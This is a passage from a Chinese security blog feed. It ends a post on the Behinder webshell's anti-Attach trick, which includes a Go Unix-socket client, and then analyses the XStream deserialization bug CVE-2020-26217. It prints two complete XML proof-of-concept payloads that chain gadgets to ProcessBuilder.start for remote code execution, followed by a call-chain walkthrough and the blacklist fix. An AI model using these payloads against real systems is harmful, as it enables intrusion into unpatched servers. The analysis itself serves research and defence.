class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s_filename := <span class="string">&quot;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/.java_pid10021&quot;</span></span><br><span class="line">addr, err := net.ResolveUnixAddr(<span class="string">&quot;unix&quot;</span>, s_filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot resolve unix addr: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拔号</span></span><br><span class="line">c, err := net.DialUnix(<span class="string">&quot;unix&quot;</span>, <span class="literal">nil</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;DialUnix failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写出</span></span><br><span class="line">context := <span class="string">&quot;hello server&quot;</span></span><br><span class="line">_, err = c.Write([]<span class="keyword">byte</span>(context))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Writes failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读结果</span></span><br><span class="line">bufsize := <span class="number">32</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, bufsize)</span><br><span class="line">nr, err := c.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Read: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>运行server</li><li>运行client，tcp连接ok，数据传输ok</li><li>删除java_pid</li><li>运行client，tcp连接失败</li><li>nc -lkU java_pid，创建相同文件</li><li>运行client，仍然连接失败</li></ol><h3 id="JVM信号"><a href="#JVM信号" class="headerlink" title="JVM信号"></a>JVM信号</h3><p>如上，通过恢复java_pid重建连接的思路无法走通，那有其他的思路重新让jvm建立新的tcp server吗？</p><p>第一步时是通过SIGQUIT信号触发jvm init tcp server的，有没有其他信号可以重现呢？可惜通过参考【4】，并未发现有如此功能的信号。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文复现了冰蝎为防止常见内存马检测antiAgent的功能（不得不膜拜beyond大佬，对Java实在是熟悉），在此基础上分析其实现原理，得出无法绕过的悲情结论。</p><p>不过无法Attach本身就是一个强特征（虽然有些/tmp目录清理会导致误报），也使得antiAgent有利有弊，攻击者也需要斟酌而用。</p><p>水平有限，如有疏漏，恳请告知。</p><p>———–20210624补充————</p><p>参考【11】中带头大哥 补充了关于冰蝎3.0beta8版本windows的实现，AntiAttach原理是通过关闭sun.tools.attach.WindowsVirtualMachine pipe，带头大哥 通过分析WindowsVirtualMachine JNI的实现得出：</p><blockquote><p>WindowsVirtualMachine是通过向目标JVM注入shellcode来执行我们与目标JVM的通信指令。Pipe只是一种通信手段，关闭pipe并不能影响我们向目标JVM加载javaagent。</p></blockquote><p>大哥66的</p><p>在linux侧，转化为的问题是：UnixSocket文件删除之后如何恢复原有的server连接？本文只尝试了新建同名socket文件，或者还有其他方式？这块还是菜🐔，求知道的大佬们指点。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1]<a href="https://www.jianshu.com/p/542e50edc8e3">Java Attach机制</a></li><li>[2]<a href="https://www.jianshu.com/p/5e1d3dab8534">RASP研发踩坑之attach失败</a></li><li>[3]<a href="https://mp.weixin.qq.com/s?__biz=MzIzNjI1ODc2OA==&mid=2650886799&idx=1&sn=108c5fdfcd2695594d4f80ff02fc9a70&mpshare=1&scene=21&srcid=0114WsKpUmDXhRtqy8x7JX5w#wechat_redirect">JVM源码分析之Attach机制实现完全解读</a></li><li>[4]<a href="https://www.ibm.com/docs/zh/sdk-java-technology/7?topic=hjps-signals-used-by-jvm">JVM 所使用的信号</a></li><li>[5]<a href="https://stackoverflow.com/questions/5769877/attachnotsupportedexception-due-to-missing-java-pid-file-in-attach-api">AttachNotSupportedException due to missing java_pid file in Attach API</a></li><li>[6]<a href="https://club.perfma.com/article/1596501">使用Go语言实现Attach到目标JVM进程</a></li><li>[7]<a href="http://jrasp.com/boke/#java-attach-api-%E4%BB%8B%E7%BB%8D">Java Instrumentation原理</a></li><li>[8]<a href="https://paper.seebug.org/1381/">Tomcat 内存马检测</a></li><li>[9]<a href="https://cloud.tencent.com/developer/article/1768499">杂谈Java内存Webshell的攻与防</a></li><li>[10]<a href="https://cloud.tencent.com/developer/news/476186">Java动态调试技术原理及实践</a></li><li>[11]<a href="https://forum.butian.net/share/142">冰蝎beta8内存马防查杀破解</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;webshell的隐藏与检出一直以来都是攻防的焦点，随着内存马的研究与工具的公开，内存shell已然成为了webshell主流。&lt;/p&gt;
&lt;p&gt;引用【9】中关于攻击的思路&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;基于Servlet规范的利用，动态注册Servlet规范中的组件，包括Servlet，Filter，Listener，这部分的公开文章比较多，比如：基于tomcat的内存 Webshell 无文件攻击技术（&lt;a href=&quot;https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82&quot;&gt;https://xz.aliyun.com/t/7388）。&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;基于特定框架的利用，框架一般对于Servlet又进行了一层封装，动态注册框架的路由，文章：基于内存 Webshell 的无文件攻击技术研究（&lt;a href=&quot;https://www.anquanke.com/post/id/198886%EF%BC%89&quot;&gt;https://www.anquanke.com/post/id/198886）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;基于javaagent修改Servlet处理流程中的字节码，工具：memShell（&lt;a href=&quot;https://github.com/rebeyond/memShell%EF%BC%89&quot;&gt;https://github.com/rebeyond/memShell）&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;引用【8】中关于检测的思路&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;无论是以上哪种攻击方式，从防守方的角度来说，检测的方式都是通过java instrumentation机制，将检测jar包attach到tomcat jvm，检查加载到jvm中的类是否异常。整体检测思路为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取tomcat jvm中所有加载的类&lt;/li&gt;
&lt;li&gt;遍历每个类，判断是否为风险类。我们把可能被攻击方新增/修改内存中的类，标记为风险类（比如实现了filter/servlet的类）&lt;/li&gt;
&lt;li&gt;遍历风险类，检查是否为webshell：&lt;/li&gt;
&lt;li&gt;检查高风险类的class文件是否存在；&lt;/li&gt;
&lt;li&gt;反编译风险类字节码，检查java文件中包含恶意代码&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;有攻有防，而防御又引发攻击的升级，冰蝎最新版已经加入了反VirtualMachine.Attach功能。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="冰蝎" scheme="http://m0d9.me/tags/%E5%86%B0%E8%9D%8E/"/>
    
    <category term="Attach" scheme="http://m0d9.me/tags/Attach/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化详解（二）</title>
    <link href="http://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-05-10T09:04:00.000Z</published>
    <updated>2021-06-07T03:49:25.032Z</updated>
    
    <content type="html"><![CDATA[<p>前文已经讲过XStream的反序列化特性及漏洞产生的原因，以及&lt;=1.4.6版本的几个gadget，在此背景上，本节准备复现披露的几个RCE CVE，正向分析下。</p><p>XStream团队很有意思，安全公告会把POC也公开，具体可以看<a href="https://x-stream.github.io/security.html%E3%80%82">https://x-stream.github.io/security.html。</a></p><h2 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h2><p>这个其实就是Wh1t3p1g师傅中提到的第4个ImageIO gadget，在marshalsec gadgets ImageIO中也有，下面正向跟踪下。</p><h3 id="Wh1t3p1g师傅的POC"><a href="#Wh1t3p1g师傅的POC" class="headerlink" title="Wh1t3p1g师傅的POC"></a>Wh1t3p1g师傅的POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;&#x2F;initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;&#x2F;opmode&gt;</span><br><span class="line">                &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command class&#x3D;&quot;java.util.Arrays$ArrayList&quot;&gt;</span><br><span class="line">                        &lt;a class&#x3D;&quot;string-array&quot;&gt;</span><br><span class="line">                          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;-a&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">                        &lt;&#x2F;a&gt;</span><br><span class="line">                      &lt;&#x2F;command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;</span><br><span class="line">                    &lt;&#x2F;next&gt;</span><br><span class="line">                  &lt;&#x2F;iter&gt;</span><br><span class="line">                  &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;&#x2F;name&gt;</span><br><span class="line">                      &lt;parameter-types&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;&#x2F;name&gt;</span><br><span class="line">                  &lt;&#x2F;filter&gt;</span><br><span class="line">                  &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;</span><br><span class="line">                &lt;&#x2F;serviceIterator&gt;</span><br><span class="line">                &lt;lock&#x2F;&gt;</span><br><span class="line">              &lt;&#x2F;cipher&gt;</span><br><span class="line">              &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;&#x2F;done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;&#x2F;ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;&#x2F;ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;&#x2F;closed&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><p>简单解释下调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 1. XStream 处理Map类型 去调用</span><br><span class="line">jdk.nashorn.internal.objects.NativeString#hashCode</span><br><span class="line"># 2. hashCode执行了this.value.toString()，将其中value设置为Base64Data</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</span><br><span class="line"># 3. Base64Data.toString执行了this.dataHandler.getDataSource().getInputStream()，指定其中属性dataHandler为javax.activation.DataHandler</span><br><span class="line">javax.activation.DataHandler#getDataSource</span><br><span class="line"># 4. DataHandler.getDataSource()返回属性类型为DataSource，该属性 置为XmlDataSource</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream</span><br><span class="line"># 5. XmlDataSource 有个InputStream的属性，为getInputStream返回值，设置为CipherInputStream。</span><br><span class="line"># 回到步骤3，执行完getInputStream之后，执行了readFrom(is)，实际调用is.read</span><br><span class="line">javax.crypto.CipherInputStream#read -&gt; getMoreData</span><br><span class="line"># 6. CipherInputStream.read调用this.cipher.update()，其中指定cipher为NullCipher</span><br><span class="line">javax.crypto.NullCipher#update -&gt; chooseFirstProvider</span><br><span class="line"># 7. NullCipher.update执行了父类的方法Cipher.chooseFirstProvider，继续执行了this.serviceIterator.hasNext(),其中serviceIterator 置为FilterIterator</span><br><span class="line">javax.imageio.spi.FilterIterator#next</span><br><span class="line"># 8. FilterIterator.next执行了filter.filter()，其中filter为属性，置该属性为ContainsFilter实例</span><br><span class="line">javax.imageio.ImageIO.ContainsFilter#filter</span><br><span class="line"># 9. ContainsFilter.filter执行了method.invoke(elt)，其中method为类属性可控，elt为参数，为iter的next()值</span><br><span class="line">ProcessBuilder#start</span><br></pre></td></tr></table></figure><h3 id="官网的POC"><a href="#官网的POC" class="headerlink" title="官网的POC"></a>官网的POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两个POC大同小异，最不同点在FilterIterator的构造，涉及到filter.filter(elt) 中的elt是如何实现可控的</p><h3 id="控制elt"><a href="#控制elt" class="headerlink" title="控制elt"></a>控制elt</h3><p>这里是FilterIterator类的代码，目标是控制filter.filter(elt)中的elt，注意比较两个POC在FilterIterator这里的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#javax.imageio.spi.FilterIterator</span><br><span class="line">    <span class="keyword">private</span> Iterator&lt;T&gt; iter;</span><br><span class="line">    <span class="keyword">private</span> ServiceRegistry.Filter filter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T next = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">advance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            T elt = iter.next();</span><br><span class="line">            <span class="keyword">if</span> (filter.filter(elt)) &#123;</span><br><span class="line">                next = elt;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> next != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        &#125;</span><br><span class="line">        T o = next;</span><br><span class="line">        advance();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li><p>官网的java.util.ArrayList$Itr实现<br>用的是java.util.ArrayList$Itr<br>其中需要注意ArrayList.this，当ArrayList add/grow，都会更新ArrayList.elementData，所以iter.next()成功取到ProcessBuilder实例。<br><img src="/images/pasted-138.png" alt="upload successful"></p></li><li><p>Wh1t3p1g师傅的java.util.Collections$EmptyIterator实现<br>用的是java.util.Collections$EmptyIterator，这里注意嵌套了两层</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Iterator it = makeFilterIterator(</span><br><span class="line">                makeFilterIterator(Collections.emptyIterator(), obj, <span class="keyword">null</span>),</span><br><span class="line">                <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">                filter</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p> 这里的控制elt的思路如下：</p><ul><li>step1:利用的是EmptyIterator hasNext() 为false，构造了第一层FilterIterator iter1，使得iter1.next() = iter1.next</li><li>step2:再构造一层 FilterIterator iter2，iter2.iter=iter1,使得iter2.next() = iter2.iter1.next() = iter2.iter1.next</li></ul></li></ol><p><img src="/images/pasted-139.png" alt="upload successful"></p><h3 id="黑名单："><a href="#黑名单：" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.imageio.ImageIO$ContainsFilter</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h2><p>author: 